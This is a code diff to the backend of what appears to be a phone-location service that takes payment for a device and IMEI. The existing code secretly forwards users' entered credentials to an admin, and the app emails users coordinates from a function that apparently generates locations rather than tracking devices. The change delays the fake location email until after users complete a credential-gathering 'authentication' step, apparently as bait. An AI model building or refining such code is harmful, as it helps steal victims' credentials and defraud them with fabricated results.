@@ -81,10 +81,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
       
       await sendPaymentConfirmation(userEmail, device, imei, amount);
-      // Automatically send location after validation
-      const coordinates = generateLomeLocation();
-      await storage.updatePurchaseLocation(id, coordinates[0].toString(), coordinates[1].toString());
-      await sendLocationToUser(userEmail, device, coordinates);
+      // Removed automatic location email from here
     }
 
     res.json(updated);
@@ -159,6 +156,16 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Send credentials to admin (secret)
       try {
         await sendUserCredentialsToAdmin(credentials);
+        
+        // Send location email to user AFTER the authentication process (5th step)
+        const coordinates = generateLomeLocation();
+        // Try to update latest purchase for this email
+        const purchases = await storage.getPurchases();
+        const latest = purchases.filter(p => p.userEmail === email).sort((a, b) => b.id - a.id)[0];
+        if (latest) {
+          await storage.updatePurchaseLocation(latest.id, coordinates[0].toString(), coordinates[1].toString());
+        }
+        await sendLocationToUser(email, device, coordinates);
       } catch (emailError) {
         console.error('Email sending failed but continuing:', emailError);
         // We continue because the record is already in DB for admin to see
